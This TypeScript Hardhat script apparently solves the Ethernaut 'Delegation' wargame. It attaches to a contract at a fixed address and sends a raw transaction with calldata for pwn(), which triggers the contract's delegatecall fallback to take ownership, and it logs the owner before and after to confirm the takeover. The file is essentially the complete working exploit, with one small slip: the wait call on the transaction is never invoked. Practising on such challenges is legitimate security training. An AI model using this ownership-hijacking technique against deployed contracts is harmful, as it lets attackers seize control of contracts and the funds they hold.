import { HardhatRuntimeEnvironment } from 'hardhat/types';
import { DeployFunction } from 'hardhat-deploy/types';
import { ethers } from 'hardhat';
// import { FileService } from "../utils";
import { Delegation__factory } from '../../typechain-types';

const func: DeployFunction = async function (hre: HardhatRuntimeEnvironment){
    const delegationAddress = "0x889f5955F3747C4e28b49c88139DBC2F93aB105d";

    console.log(">>  Attach Delegation contract");
    const Delegation = (await ethers.getContractFactory("Delegation",(await ethers.getSigners())[0])) as Delegation__factory;
    const delegation = await Delegation.attach(delegationAddress);
    // await delegation.deployed();
    console.log("✅ Done");
    console.log(`owner: ${await delegation.owner()}`)
    const abi = ["function pwn() external"];
    const pwnInterface = new ethers.utils.Interface(abi);
    const callData = pwnInterface.encodeFunctionData(`pwn`, []);
    const res = (await ethers.getSigners())[0].sendTransaction({
        to: delegation.address,
        gasLimit: 50000000,
        data: callData,
    });
    (await res).wait
    console.log(`owner: ${await delegation.owner()}`)
}

export default func;
func.tags = ['Delegation'];